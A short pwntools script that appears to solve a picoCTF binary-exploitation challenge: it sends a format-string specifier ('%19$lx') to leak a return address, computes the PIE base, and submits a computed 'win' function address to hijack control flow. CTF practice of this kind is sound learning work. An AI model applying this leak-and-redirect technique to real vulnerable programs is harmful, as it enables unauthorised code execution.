from pwn import *

# main+65
MAIN_RET_ADDR = 0x0000000000001441
WIN_ADDR = 0x000000000000136A

# nc rescued-float.picoctf.net 49233
conn = remote("rescued-float.picoctf.net", 49233)

conn.recvuntil(b"Enter your name:")

# (0x68 - 0x10) / 8 + 8 = 19 (memo.md を参照)
conn.sendline(b"%19$lx")
main_pie_addr = int(conn.recvline(), 16)
print(f"main_pie_addr: {hex(main_pie_addr)}")

pie_offset = main_pie_addr - MAIN_RET_ADDR
print(f"pie_offset: {hex(pie_offset)}")

win_addr = WIN_ADDR + pie_offset
print(f"win_addr: {hex(win_addr)}")

conn.recvuntil(b"ex => 0x12345: ")
conn.sendline(hex(win_addr).encode())

conn.interactive()
